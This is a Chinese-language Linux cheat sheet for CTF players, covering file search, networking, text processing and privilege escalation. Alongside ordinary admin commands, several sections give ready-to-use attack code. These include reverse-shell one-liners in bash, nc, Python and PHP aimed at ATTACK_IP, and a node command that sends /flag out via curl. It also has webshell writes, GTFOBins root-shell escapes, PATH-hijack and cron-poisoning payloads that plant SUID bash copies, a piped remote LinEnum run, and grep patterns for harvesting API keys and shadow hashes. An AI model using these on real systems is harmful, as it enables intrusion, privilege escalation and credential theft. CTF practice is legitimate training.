# linux|Linux 与命令速查|🐧

## [g-files] 文件与目录——最常用的列举、查找、查看与权限管理

### [ls-find-view] 文件列举、查找与查看 | easy | 目录;查找;查看 | ls;find;cat;less
> 掌握 ls/find 的常用参数与 cat/less/head/tail/stat 的查看方式，是任何 Linux 操作的第一步。

#### ls 常用参数

```bash
ls -la          # 列出所有文件，含隐藏文件（-a）与详细信息（-l）
ls -lah         # 加 -h 显示人类可读大小（K/M/G）
ls -lt          # 按修改时间倒序排列，最新在前
ls -l /dir      # 查看指定目录
ls -ld /dir     # 只看目录本身的信息，不看其内容
```

> [!tip] 权限位第 1 位：`-` 普通文件，`d` 目录，`l` 软链接，`s` socket，`p` 管道，`b/c` 块/字符设备。

#### find 常用参数

```bash
find / -name 'flag*' 2>/dev/null            # 按文件名找，过滤权限错误
find / -type f -size +1M 2>/dev/null        # 按类型/大小找（+1M 大于、-1k 小于）
find / -mtime -7 2>/dev/null                # 最近 7 天内修改（-atime 访问、-ctime 状态）
find / -user root -group root 2>/dev/null   # 按属主/属组过滤
find / -name "*.php" -exec cat {} \;        # 对结果执行命令（{} 为占位，\; 结束）
find / -perm -4000 2>/dev/null              # 按权限位找（SUID，详见提权组）
find . -type f | xargs -n1 grep -l "key"    # 找到文件后交由 xargs 批量处理
```

> [!warn] 全盘 find 很慢，先缩小目录范围（/var /home /tmp /www /opt）。`2>/dev/null` 可丢掉无权限读取时刷屏的报错。

#### 查看文件

```bash
cat file            # 全部输出
cat -n file         # 带行号
tac file            # 倒序输出（从最后一行开始）
less file           # 分页查看，q 退出，/搜索，n 下一个匹配，G 到底部
head -n 20 file     # 前 20 行
tail -n 20 file     # 后 20 行
tail -f /var/log/xxx.log   # 实时跟踪追加内容（CTF 常用来盯日志/flag 写入）
stat file           # 详细元数据：大小、权限、属主、时间戳（mtime 常提示文件被改过）
file file           # 识别文件真实类型（不信任扩展名）
strings file        # 提取二进制中的可打印字符串，找 flag 常用
```

> [!tip] 排查可疑文件时 `stat` 的 mtime/ctime 与 `strings` 里出现的地址、密钥、路径往往就是线索。

### [file-perm] 文件权限：chmod/chown/umask | easy | 权限;chmod;chown | permission
> 权限用 3 组 rwx 表示属主/属组/其他，数字法（4+2+1）与符号法（u/g/o/a+-rwx）是两种标准写法。

#### 权限数字记忆法

| 数字 | 含义 | 组合 |
|------|------|------|
| 4 | r 读 | 7=rwx 读写执行 |
| 2 | w 写 | 6=rw 读写 |
| 1 | x 执行 | 5=rx 读执行 |
| 0 | 无 | 4=r 只读 |

```bash
chmod 755 file          # 属主 rwx，属组/其他 rx
chmod 644 file          # 属主 rw，属组/其他 r
chmod u+x file          # 符号法：给属主加执行位
chmod g-w,o-r file      # 属组去写、其他去读
chmod -R 755 dir/       # 递归修改
chmod +s file           # 设置 SUID（见提权组）
chown user:group file   # 改属主:属组
chown -R www:www dir/   # 递归改
umask                    # 查看当前 umask（如 0022）
umask 022                # 新建文件默认权限 = 666 & ~umask，新目录 = 777 & ~umask
```

> [!tip] 默认创建：普通文件 666、目录 777，再减去 umask 的位。umask 022 ⇒ 文件 644、目录 755。umask 000 意味文件 666，任何用户可写。
> [!warn] 需要"写执行`命名的目录"才能在其中创建/删除文件，与文件本身的权限无关——目录的可写性取决于目录的 w 位（粘滞位目录除外）。

#### 特殊权限位

| 位 | 数字 | 作用 |
|----|------|------|
| SUID | 4xxx（如 4755） | 执行时以**属主**身份运行（如 /usr/bin/passwd） |
| SGID | 2xxx | 执行时以属组身份运行；目录上则新文件继承属组 |
| Sticky | 1xxx（如 1777，/tmp） | 目录内只能删自己的文件 |

### [hard-soft-link] 软链接与硬链接 ln | medium | 链接;ln;inode | symlink
> 软链接（symlink）是"快捷方式"，可跨文件系统、可指向目录；硬链接是同一 inode 的另一个名字，不能跨文件系统、不能指目录。

```bash
ln -s target link        # 建立软链接 link -> target
ln target hard           # 建立硬链接（两个名字指向同一 inode）
ln -sf new old           # -f 覆盖已存在的链接
readlink link            # 查看软链接指向的真实路径
ls -li                   # -i 显示 inode 号，硬链接 inode 相同
stat link                # 比较 Inode 与 Link count
```

> [!tip] 判断链接类型：`ls -l` 第 1 位 `l` 是软链接；硬链接在 ls 里看不出区别，只有 `ls -li` 对比 inode 或用 `stat` 看 Links 数。
> [!warn] 删掉原文件后：软链接失效（悬空链接），硬链接仍可正常访问内容，因为数据靠 inode 引用计数存活。

## [g-findgrep] 查找与过滤——找 flag、搜敏感词、啃日志配置

### [find-flag] 全盘搜索 flag | easy | flag;find;搜索 | 找flag
> CTF 第一件事：拿到 shell 或任意文件读取后，用 find 全盘扫文件名与文件内容中的 flag 关键字。

```bash
find / -name '*flag*' 2>/dev/null                 # 文件名含 flag
find / -iname '*flag*' 2>/dev/null                # -iname 不区分大小写
find / -name '*ctf*' -o -name '*key*' 2>/dev/null # 多个关键字
find / -type f -exec grep -l 'flag{' {} \; 2>/dev/null   # 内容匹配 flag{（慢）
grep -r 'flag{' /var/www /home /tmp /root 2>/dev/null    # 指定目录快速搜内容
grep -rhoE 'flag\{[^}]+\}' / 2>/dev/null                 # 直接抽出满足格式的 flag
```

> [!tip] 内容搜索优先限定目录而不是 `grep -r /`。常见 flag 格式：`flag{...}`、`ctf{...}`、`FLAG{...}`、`NSSCTF{...}`。
> [!warn] 内存/进程里也常有 flag：`strings /proc/*/environ`、`grep -a flag /proc/*/cmdline`（-a 把二进制当文本）。

### [grep-secrets] grep 搜敏感信息 | medium | grep;正则;密钥;token | 搜key
> 用正则匹配 key/token/password/secret/api 等敏感词，常用于部署文件、源码、环境变量与回显抓取。

```bash
grep -rE '(api[_-]?key|secret|token|password|passwd|pwd|private[_-]?key)' . 2>/dev/null
grep -rE 'AKIA[0-9A-Z]{16}' /                     # AWS Access Key 样式
grep -rE 'sk-[A-Za-z0-9]{20,}' /                 # OpenAI key 样式
grep -rE 'BEGIN (RSA |EC |OPENSSH )?PRIVATE KEY' /   # 私钥
grep -rn 'password\s*=\s*' /etc /var/www 2>/dev/null
grep -rni 'user.*pass' --include='*.php' --include='*.py' .   # 限定扩展名
ls -la .env config.php wp-config.php settings.py 2>/dev/null # 常见配置文件直接看
```

> [!tip] grep 参数：`-r` 递归、`-i` 忽略大小写、`-n` 显示行号、`-l` 只列文件名、`-h` 不打印文件名、`-o` 只输出匹配部分、`-E` 扩展正则。
> [!warn] 回显被截断是常见考点：`env | grep -iE 'key|secret|flag'` 或 `cat /proc/self/environ | tr '\0' '\n'` 能翻出容器/进程环境的隐藏变量。

### [log-config-search] 日志与配置定位 | medium | 日志;配置;搜索;路径 | log
> 拿到 RCE 后快速定位日志、配置、源码路径，Web 日志里的请求参数、源码路径与数据库密码是高频信息源。

```bash
find / -name '*.log' -type f 2>/dev/null | head -50     # 找日志
ls /var/log/                                             # 常见日志目录
tail -n 100 /var/log/nginx/access.log                    # Nginx 访问日志
tail -n 100 /var/log/apache2/access.log                  # Apache 访问日志
tail -n 100 /var/log/messages /var/log/syslog 2>/dev/null
find /etc /opt /usr/local /var/www -name '*.conf' -o -name '*.ini' 2>/dev/null
grep -rE '(mysql|db|database).*(pass|pwd)' /var/www /opt 2>/dev/null
grep -E '(root|admin|user)' /etc/nginx/nginx.conf /etc/httpd/conf/httpd.conf 2>/dev/null
locate wp-config.php 2>/dev/null || updatedb            # locate 基于索引，更快
```

> [!tip] Nginx/PHP-FPM 报错日志常泄露绝对路径（/var/www/html/...），直接决定后续文件读取与写入目标。`.bash_history`、`/root/.ssh/known_hosts`、`/etc/shadow` 也要列入检查清单。

## [g-net] 网络与监听——端口、HTTP 请求、nc 与 ssh

### [port-listen] 端口与监听查看 | easy | 端口;netstat;ss;lsof | ss
> 判断开了哪些服务、谁在监听，是内网探测和信息收集的基本功；注意 ss/netstat 的参数差异。

```bash
ss -tlnp            # 监听中的 TCP（-t TCP -l 监听 -n 数字 -p 进程）
ss -tunap           # TCP+UDP 全部连接，含进程
netstat -tlnp       # 老写法，未装 ss 时用
netstat -ano        # Windows 上常用
lsof -i :8080       # 谁占用了 8080
lsof -i             # 全部网络连接
lsof -p PID         # 某进程打开的文件/连接
ps aux | grep -i 'ssh\|nginx\|apache\|mysql'   # 用进程也能反查服务
cat /proc/net/tcp   # 内核视角的 TCP 连接（无权限时看这个）
```

> [!tip] 内网场景先 `ss -tlnp` 记下所有监听端口，再逐一 curl/nc 探活。`/proc/net/tcp` 里是十六进制端口，`printf '%x' 8080` 可换算。
> [!warn] 容器里可能没有 ss/netstat，改用 `cat /proc/net/tcp` 或 `ls /proc/*/fd 2>/dev/null` 看 socket 文件描述符。

### [curl-wget] curl 与 wget 常用参数 | easy | curl;wget;http | 请求
> curl 是 CTF 最常用 HTTP 客户端：发 GET/POST、带 Cookie/Header、跟跳转、保存响应一步到位。

```bash
curl -s http://target/                     # -s 静默，不显示进度条
curl -sI http://target/                    # -I 只取响应头
curl -s http://target/ -o out.html         # 保存到文件
curl -sL http://target/                    # -L 跟随 30x 跳转
curl -s -X POST http://target/api/login \
     -d 'user=admin&pass=123456'           # POST 表单
curl -s -H 'X-Forwarded-For: 127.0.0.1' -H 'User-Agent: Mozilla' http://target/
curl -s http://target/ -H 'Cookie: session=abc123' -b 'session=abc123'
curl -s -F 'file=@/etc/passwd' http://target/upload     # 上传文件（multipart）
curl -s --data-urlencode 'cmd=whoami' http://target/    # 自动 URL 编码，防特殊字符
curl -s -d '{"a":1}' -H 'Content-Type: application/json' http://target/api
curl -s -x http://proxy:8080 http://target/             # 走代理
curl -sk https://target/                 # -k 忽略证书校验
curl -s -u admin:admin http://target/    # Basic Auth
curl -s http://target/file -r 0-1023     # 断点范围请求（读文件偏移）
# 批量爆破：
for i in $(seq 1 100); do curl -s -d "id=$i" http://target/get | grep -o 'flag{.*}'; done
```

```bash
wget -q http://target/file.zip                  # -q 静默
wget -r -np http://target/dir/                  # 递归下载目录（爬站点资源）
wget --post-data='a=1' http://target/login      # POST
```

> [!warn] `-d` 与 `-X POST` 搭配时注意：`-d` 本身就会把方法改成 POST。JSON 请求记得加 `-H 'Content-Type: application/json'` 且用单引号包住引号。

### [nc-ssh] nc 与 ssh：反弹、监听、转发 | medium | nc;ssh;端口转发;跳板 | netcat
> nc 是网络瑞士军刀（收发任意 TCP/UDP），ssh 是远程管理标配；两者组合覆盖反弹 shell、生传文件、隧道三个高频场景。

```bash
# nc 监听与连接
nc -lvnp 4444                 # 监听 4444（-l 监听 -v 详细 -n 不解析 -p 端口）
nc target 4444                # 连接目标端口，连上后可直接收发数据
nc -u -lvnp 53                # UDP 监听（某些反连检测场景）
timeout 1 nc -zv target 80    # 快速端口连通性探测（-z 不传数据）
nc -lvnp 9999 < shell.php     # 传文件：监听方把收到的内容写成文件
nc target 9999 > shell.php    # 连接方把本地文件发过去

# 反弹 shell（攻击机先 nc -lvnp 4444，目标机器再执行）
bash -i >& /dev/tcp/ATTACK_IP/4444 0>&1
nc -e /bin/sh ATTACK_IP 4444              # nc 带 -e 的版本
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc ATTACK_IP 4444 > /tmp/f   # 无 -e 万能版
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACK_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# ssh 常用
ssh user@host                          # 基本登录
ssh -i id_rsa user@host                # 密钥登录（权限要 600）
ssh-keygen -t ed25519 -f mykey         # 生成密钥对（配 -N '' 免密码）
ssh-copy-id user@host                  # 公钥装到远端 authorized_keys
ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null user@host   # 跳过指纹确认
ssh -J jump@bastion user@target        # 跳板机 ProxyJump（-J）
ssh -L 8080:127.0.0.1:80 user@host     # 本地转发：本机 8080 -> 远端看到的 80
ssh -R 8080:127.0.0.1:80 user@host     # 远程转发：远端 8080 -> 本机 80
ssh -D 1080 user@host                  # 动态 SOCKS5 代理
scp -i key file user@host:/tmp/        # 复制文件
sftp user@host                         # 交互式文件传输
```

> [!tip] 反弹 shell 用 `python -c` 版兼容性最好（不依赖 /bin/sh 重定向与 nc -e）。转发链：`ssh -L` 是把远端某端口"搬"到本地，配合 `ssh -J` 可一层层打进内网。

## [g-proc] 进程与系统——ps/top、systemctl、环境变量、定时任务

### [ps-top] 进程查看与控制 | easy | 进程;ps;top | 进程管理
> ps 是静态快照，top 是动态实时；先看进程再决定杀谁、提权对象是谁。

```bash
ps aux                 # 全部进程（a 所有用户，u 用户格式，x 无终端进程）
ps aux | grep -i php   # 过滤目标进程
ps -ef                 # 标准格式全进程
ps -e -o pid,ppid,user,args    # 自定义列：PID、父 PID、用户、命令行
ps -fp PID             # 按 PID 查单进程
top                    # 实时（P 按 CPU 排，M 按内存排，k 杀进程，q 退出）
htop                   # 更好看的实时监控（可能未装）
pstree                 # 进程树，看父子关系
kill -9 PID            # 强杀（-9 SIGKILL；-15 SIGTERM 优雅退出）
sleep 31337 &          # 后台挂进程占时间（有的题考长超时 flag 释放）
watch -n1 'ps aux | grep -v grep | grep flag'   # 每秒观察 flag 进程是否出现
```

> [!tip] 可疑进程看 `args` 或 `/proc/PID/cmdline` 与 `/proc/PID/environ`（`tr '\0' '\n' < /proc/PID/environ`），常有密钥与 flag。父进程反查 `pstree` 能还原攻击路径。

### [sysctl-service] systemctl 服务管理 | medium | systemctl;服务;开机 | service
> 管理 systemd 服务：启动/停止/重启/开机自启，以及看服务日志与单元文件，服务配置错误本身也是常见 misconfig。

```bash
systemctl status nginx          # 服务状态（含最近日志与 PID）
systemctl start/stop/restart nginx
systemctl enable --now nginx    # 开机自启并立即启动
systemctl disable nginx         # 取消自启
systemctl list-units --type=service --state=running   # 运行中的服务
systemctl list-unit-files | grep enabled              # 开机自启清单
systemctl cat nginx             # 查看服务单元文件内容
systemctl edit nginx            # 编辑 override
journalctl -u nginx -n 50       # 看某服务最近 50 行日志
journalctl -n 100 -f            # 全系统日志实时跟踪
systemctl list-timers           # 定时器（cron 的 systemd 版）
service nginx status            # 老式 SysV 写法
```

> [!tip] 容器里通常没有 systemd（PID 1 是应用），用 `ps -p 1` 确认。提权时关注 systemd timer / 服务 ExecStart 指向可写脚本的场景。

### [env-cron] 环境变量与定时任务 | easy | 环境变量;cron;内核 | env;crontab
> 环境变量里藏密钥、crontab 里有可写脚本、uname 决定内核版本——三个都是 CTF 高频信息点。

```bash
env                    # 查看全部环境变量
echo $PATH             # PATH 顺序决定命令解析（PATH 劫持见提权组）
export VAR=value       # 导出变量（仅当前 shell 生效；写 /etc/profile 或 ~/.bashrc 持久化）
unset VAR              # 删除变量
printenv SECRET        # 只看单个变量
uname -r               # 内核版本（查已知内核漏洞：如 Dirty Pipe、OverlayFS）
uname -a               # 完整内核信息
cat /etc/os-release    # 发行版与版本
cat /etc/redhat-release /etc/lsb-release 2>/dev/null
crontab -l             # 当前用户定时任务
crontab -u root -l     # 看 root 的定时任务（有权限时）
cat /etc/crontab       # 系统级 crontab（常含脚本路径，检查是否可写）
ls -la /etc/cron.d/ /etc/cron.daily/ /var/spool/cron/   # 各 cron 目录
```
```txt
# crontab 五段格式：分 时 日 月 周
*/5 * * * * /usr/local/bin/cleanup.sh   每分钟第 0/5/10...分执行
@reboot /opt/start.sh                   开机执行（@reboot 很常见）
```

> [!warn] cron 环境是精简的：`PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin`，脚本里用相对命令名就存在 PATH 劫持机会。cron 日志在 `journalctl -u cron` 或 `/var/log/cron`。

## [g-text] 文本处理——awk/sed/sort/uniq/cut 组合拳

### [awk-sed] awk 与 sed 流处理 | medium | awk;sed;文本处理 | awk提取
> awk 按列拆分、按条件处理，sed 做替换与范围编辑；两者是日志分析、配置文件修改的主力。

```bash
cat file | awk '{print $1}'              # 每行取第 1 列（默认空格/Tab 分隔）
awk -F: '{print $1}' /etc/passwd         # -F: 指定分隔符为冒号
awk -F: '$3==0{print $1}' /etc/passwd    # 条件过滤：uid 为 0 的用户
awk '{print NR": "$0}' file              # NR 行号，$0 整行
awk 'NR>=10 && NR<=20' file              # 取第 10-20 行
awk '{sum+=$1} END{print sum}' file      # 累加求和，END 在所有行处理完后执行
awk -F, '{print $2}' file.csv            # 处理 CSV

sed -n '5,10p' file            # 打印第 5-10 行
sed -i 's/old/new/g' file      # 全局替换并写回（-i 直接改文件）
sed 's/flag{\(.*\)}/\1/' file  # 捕获组提取 flag 内容
sed '/^#/d;/^$/d' file         # 删注释行与空行
sed -n 's/.*key=\([^ &]*\).*/\1/p' file   # 从一行中抓参数值
```

> [!tip] 记牢三件套：取列用 `awk -F'分隔符' '{print $N}'`，替换用 `sed 's/旧/新/g'`，打印范围用 `sed -n 'A,Bp'`。awk 里 `$0` 整行、`$NF` 最后一列。

### [sort-uniq-cut] 去重统计与列裁剪 | easy | sort;uniq;cut;tr | 去重
> sort+uniq 做排序去重统计，cut 按列裁剪，tr 做字符替换——日志 IP 统计、词频分析一条链搞定。

```bash
sort file                    # 按字典序排序（-n 按数值、-r 倒序、-k2 按第 2 列）
sort -t: -k3 -n /etc/passwd  # 按冒号分隔的第 3 列数值排序
uniq                        # 相邻去重（必须先 sort，否则不连续行去不掉）
sort file | uniq            # 正确去重姿势
sort file | uniq -c         # 去重并计数（高频统计）
sort file | uniq -c | sort -rn   # 按出现次数从高到低排列
cut -d: -f1 /etc/passwd     # 冒号分隔取第 1 列
cut -c1-5 file              # 取每行前 5 个字符（-c 按字符）
tr 'a-z' 'A-Z' < file       # 小写转大写
tr -d '\n' < file           # 删除换行（拼一行）
tr -s ' ' < file            # 压缩连续空格为 1 个
tr '\0' '\n' < /proc/self/environ   # 环境变量 NUL 分隔转行显示
head -3 file | tail -1      # 管道组合取第 3 行
```

> [!tip] 统计 Top N：`... | sort | uniq -c | sort -rn | head -10`。Nginx 日志统计访问 IP：`awk '{print $1}' access.log | sort | uniq -c | sort -rn | head`。`tr -d` 去掉换行后 `grep -oE 'flag\{[^}]+\}'` 能拼回被截断的 flag。

### [flag-extract] 提取 flag 的典型组合命令 | medium | flag;提取;正则;组合 | 抓flag
> 从日志、回显、源码、内存转储中把 flag 抽出来的套路命令集，可直接替换目标路径使用。

```bash
# 1. 标准格式提取（任意文本）
grep -oE 'flag\{[^}]+\}' file
grep -rohE '[A-Za-z0-9_]+flag\{[^}]+\}|flag\{[^}]+\}' /path 2>/dev/null
# 兼容多种前缀：flag / ctf / nssctf / CISCN 等
grep -oiE '(flag|ctf|nss\{\?)[A-Za-z0-9_!@#$%^&*()\-=+.,;:{}|<>?~]{3,}' file

# 2. 跨行拼接（flag 被换行/标签截断时）
tr -d '\n' < file | grep -oE 'flag\{[^}]+\}'
cat file | tr -d ' \t\r\n' | grep -oE 'flag\{.*\}'

# 3. 二进制/压缩流里翻
strings file | grep -iE 'flag|\{[a-zA-Z0-9_]+\}'
binwalk file                     # 文件里藏文件/压缩包
grep -a 'flag' file              # -a 二进制当文本搜

# 4. 网络回显里抓（配合循环爆破/翻页）
curl -s http://target/api | grep -oE 'flag\{[^}]+\}'
for p in 1 2 3; do curl -s "http://target/list?page=$p"; done | grep -o 'flag{.*}'

# 5. 编码兜底：搜出来是 base64/hex
echo "ZmxhZ3t0ZXN0fQ==" | base64 -d
echo "666c61677b746573747d" | xxd -r -p
```

> [!tip] 正则 `[^}]+` 假设 flag 以 } 结尾且不含 }，对大多数题够用；若 flag 里有特殊字符，改成 `flag\{.{6,120}\}` 放宽。`grep -o` 只输出匹配本身，配合 `-r` 递归、`-h` 去文件名。

## [g-users] 用户与权限——账号、uid 0、组与可写文件

### [user-su-sudo] 用户管理与提权入口 | easy | 用户;su;sudo;useradd | 切换用户
> useradd 建账号、su 切账号、sudo 借用 root 权限——sudo 配置不当是提权的头号入口，排查清单请见提权组。

```bash
id                      # 当前用户 uid/gid/所属组
whoami ; who ; w        # 当前身份 / 登录者 / 登录详情
useradd -m -s /bin/bash newuser      # 建用户并建家目录、指定 shell
useradd -u 0 -o -g 0 root2           # 造一个 uid 0 用户（-o 允许重复 uid，等于第二个 root）
passwd newuser          # 设置/修改密码
usermod -aG sudo newuser   # 加入 sudo 组（Debian/Ubuntu；RHEL 系是 wheel）
su - root               # 切换到 root（- 带完整环境）
su user                 # 切到普通用户
sudo -l                 # 看当前用户能免密执行什么（提权核心命令！）
sudo command            # 以 root 执行单条命令
sudo -u www command     # 以指定用户执行
groups                  # 当前用户所属组
groupadd newgroup       # 创建组
ls -la /home/           # 看各家目录与权限
cat /etc/passwd         # 用户清单（每行 7 列）
cat /etc/sudoers        # sudo 规则（只有 root 能读）
```

> [!warn] 免密 sudo 是重灾区：`sudo -l` 输出 `(root) NOPASSWD: /usr/bin/find` 之类就可以直接提权（见 g-priv 的 GTFO 表）。
> [!tip] 拿到低权 shell 先三连：`id`（看组）、`sudo -l`（看免密）、`ls -la /home/*/`（看别的用户留下什么）。

### [passwd-uid] /etc/passwd、uid 0 与可写文件 | medium | passwd;uid;可写;shadow | 权限绕过
> /etc/passwd 是本地用户账本的钥匙：字段结构、uid 0 判断、可写文件查找，都是提权与持久化的根基。

```txt
# /etc/passwd 每行 7 个字段，用冒号分隔
用户名:口令占位(x):uid:gid:备注:家目录:登录shell
root:x:0:0:root:/root:/bin/bash
# 第二栏为 x 表示口令在 /etc/shadow；若直接是哈希（或空），则该用户口令可被破解或免密登录
```

```bash
awk -F: '$3==0{print "uid0:",$1}' /etc/passwd     # 找出所有 uid 0 用户（通常只有 root）
awk -F: '$2!="x" && $2!="" {print $1, $2}' /etc/passwd   # 口令直接写在 passwd 里的用户
head -1 /etc/shadow   # 有权限时看 root 哈希（$6$=sha512crypt，$y$=yescrypt）
getent shadow root    # 用 getent 读（root 权限）

# 查找当前用户可写/可控的文件（提权候选）
find / -writable -type f 2>/dev/null | grep -vE '^/(proc|sys|dev|run|tmp)/'
find / -perm -o+w -type f 2>/dev/null | grep -vE '^/(proc|sys|dev|run|tmp)/'
find / -user $(id -u) -type f 2>/dev/null | grep -vE '^/(proc|sys|dev|run)'
find / -group $(id -g) -type f 2>/dev/null | grep -vE '^/(proc|sys|dev|run)'
ls -la /etc/crontab /etc/cron.d 2>/dev/null        # 可写的定时任务脚本
find / -writable -type d 2>/dev/null | grep -vE '^/(proc|sys|dev|run|tmp|var/tmp)'
```

> [!tip] 攻击思路：把可写文件当成"能被 root 执行的脚本"考虑——cron 脚本、/etc/profile.d/*.sh、systemd unit、SUID 二进制的依赖库都是目标。
> [!danger] 永远不要在题目里直接用 `/etc/shadow` 的 root 哈希爆破硬密码以外的场景浪费时间；先看是否有 2 栏为空/为哈希的 `passwd` 直存用户（直接 `su` 空密码或破哈希）。

## [g-priv] 提权辅助速查——SUID、sudo、PATH 与 cron

### [suid-scan] SUID/SGID 与自动化枚举 | medium | suid;提权;linpeas | SUID扫描
> SUID 程序以属主（常为 root）身份执行，找到可被利用的 SUID 二进制就拿到一条提权路径；linpeas 把整个枚举自动化。

```bash
# SUID/SGID 查找（重点：属主 root 才值钱）
find / -perm -4000 -type f 2>/dev/null              # SUID
find / -perm -2000 -type f 2>/dev/null              # SGID
find / -perm -u=s -type f 2>/dev/null
find / -perm -4000 -o -perm -2000 2>/dev/null | xargs ls -la
# 也可以按 4755/6755 精确匹配
find / -perm -4755 -type f 2>/dev/null

# 手工查可滥用能力（哪些 SUID 能弹 root shell）
ls -la /usr/bin/sudo /usr/bin/passwd /usr/bin/su /usr/bin/find /usr/bin/vim \
       /usr/bin/python3 /usr/bin/perl /usr/bin/gcc /usr/bin/base64 /usr/bin/cp 2>/dev/null

# 自动化枚举（传回本地/直接跑）
curl -sL https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh -o /tmp/linpeas.sh
bash /tmp/linpeas.sh                      # 全量枚举（SUID、sudo、cron、可写、内核版本等）
bash /tmp/linpeas.sh -a                   # 更慢更全
bash /tmp/linpeas.sh -s                   # 超快模式，先看 SUID/PATH/cron
# 轻量备选
wget -qO- https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash
```

> [!tip] linpeas 输出里 `SUID`、`sudo`、`Cron`、`Writable` 段要逐行看，红色 `[!]` 即高价值点。内网无外网时，用 `--nocolor` 或先本地下载再传上去跑。
> [!warn] SUID 里有 `find`/`vim`/`python3`/`bash` 等能执行命令的，直接 GTFO（见下一条目）；即使是 `cp` 也可能用于覆盖 /etc/passwd 提权。

### [sudo-gtfo] sudo -l 与 GTFO 速查 | medium | sudo;gtfo;提权 | sudo提权
> `sudo -l` 给出当前用户可免密执行的命令，其中能调 shell 或读文件的立即变成 root；GTFOBins 是查这事的标准目录。

```bash
sudo -l              # 关键第一步：看 NOPASSWD/ALL 与具体命令
sudo -l | grep -iE 'nopasswd|\(root\)' 
```
```txt
# 常见 (root) NOPASSWD 命令 -> root shell 一行流（GTFOBins 常用款）
sudo find / -exec /bin/sh \;                    # find
sudo vim -c ':!/bin/sh'                         # vim / vi / ex
sudo python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'   # python/python3
sudo perl -e 'exec "/bin/sh"'                   # perl
sudo ruby -e 'exec "/bin/sh"'                   # ruby
sudo php -r 'system("/bin/sh");'                # php
sudo awk 'BEGIN{system("/bin/sh")}'             # awk / mawk / gawk
sudo less /etc/shadow                           # less/more/man 内 !sh 或直接读文件
sudo -u root env /bin/sh                        # env
sudo -u root bash                                # 直接给 bash 就不必绕
sudo tee /etc/passwd <<< 'root:$6$...:0:0:root:/root:/bin/bash'   # tee 写文件（谨慎：会改 shadow/passwd）
```
```bash
# 查 GTFO Bins（本地无网就记上面这些）
# 在线目录：https://gtfobins.github.io
# 对自己拥有的所有二进制批量尝试 /bin/sh：
for b in find vim less more env awk python3 php perl ruby xxd; do
  echo "=== $b ==="; command -v $b >/dev/null && $b --help >/dev/null 2>&1
done
```

> [!tip] 拿到 `sudo -l` 输出先搜 GTFOBins：每个 bin 的条目都有 `Shell`、`File read`、`File write` 分栏，找 `(root) NOPASSWD` 对应的那格。
> [!warn] 不要随手 `sudo cat /etc/shadow` 之外的破坏性操作；`tee` 改写 /etc/passwd 会破坏系统，优先找非破坏方式（读 flag 用 `sudo less /flag` 即可）。

### [path-cron-abuse] PATH 劫持与 cron 可写利用 | hard | path;cron;劫持;利用 | 脚本提权
> root 定时任务执行可写脚本或脚本内用相对命令名、且目录可写时，可以替换掉执行的程序实现提权。

#### PATH 劫持（root 通过 system() 调用相对命令）

```bash
# 1. 先审计可写位置与 PATH
echo $PATH
find / -writable -type d 2>/dev/null | grep -vE '^/(proc|sys|dev|run|tmp|var/tmp)/'
# 2. 若 /usr/local/bin 或 /tmp 在 root 脚本的搜索路径里且可写：
cat > /tmp/ps <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash
EOF
chmod +x /tmp/ps
/tmp/rootbash -p    # root 定时任务执行 ps 时会先命中 /tmp/ps
# 3. 查看 root 的 cron/服务脚本内容确认命令名
cat /etc/crontab /etc/cron.d/* /var/spool/cron/root 2>/dev/null
```

#### cron 可写脚本投毒

```bash
# 找到 root 的定时任务里可写脚本（如 /opt/scripts/clean.sh 属主是当前用户）
ls -la /etc/crontab /etc/cron.d/* /etc/cron.daily/* 2>/dev/null
# 直接写入 payload（可写即可，重启 cron 或等它跑）
cat <<'EOF' >> /opt/scripts/clean.sh
cp /bin/bash /tmp/rb && chmod 4755 /tmp/rb
EOF
# 等下一轮 cron 执行后：
/tmp/rb -p
# 或用一句话：echo 'chmod 4755 /tmp/x' 也要保证脚本本身可执行
```

> [!tip] 判定要点：1）root 的 cron/服务脚本路径或系统路径可写；2）脚本用相对命令名（PATH 劫持）或脚本本体可写（投毒）；3）`bash -p` 才能拿到 SUID bash 的 euid 0。`cd /tmp && cat > nc` 之类把系统命令换成恶意副本同理。
> [!warn] 写 Payload 后别手贱 `crontab -r` 之类把任务删了——等它下一轮执行即可；tools 目录常见 `system()`/`popen()` 调外部命令也适用同套路。

## [g-env] 环境与部署——语言一键 RCE、打包解压与数据库客户端

### [lang-rce] PHP/Python/Node 一键命令 | medium | php;python;node;rce | 一键执行
> 拿到命令执行后直接用解释器干一件事：反弹 shell、写文件、读文件、编码解码，一个 -c/-r/-e 全搞定。

```bash
# PHP（-r 直接执行，-i 显示 phpinfo）
php -r 'system("id");'
php -r 'system($_GET["c"]);'      # 常配合内嵌在可写目录当 webshell
php -r 'file_put_contents("/tmp/x.php", base64_decode("PD9waHAgc3lzdGVtKCRfR0VUW2NdKTs/Pg=="));'
php -r '$s=fsockopen("ATTACK_IP",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
printf '<?php system($_GET["c"]);?>' > /var/www/html/s.php   # 直接写 webshell（目录可写时）

# Python（-c 单行，注意引号嵌套）
python3 -c 'import os; os.system("id")'
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACK_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
python3 -c 'import pty; pty.spawn("/bin/bash")'   # 把反弹 shell 升级成交互式
python3 -c 'print(open("/flag").read())'
python3 -c 'import base64; print(base64.b64encode(open("/flag","rb").read()).decode())'

# Node（-e 直接执行）
node -e 'require("child_process").execSync("id",{stdio:"inherit"})'
node -e 'require("child_process").exec("curl ATTACK_IP:4444/$(cat /flag)")'
node -e 'process.mainModule.require("child_process").execSync("id")'   # 老版本兼容
```

> [!tip] 反弹/升级 shell 优先级：`pty.spawn` 给交互能力，`os.dup2` 三连是兼容性最好的反连模板。`php -r` 里 `$_GET` 说明可把 php 文件放 web 目录秒变 webshell。

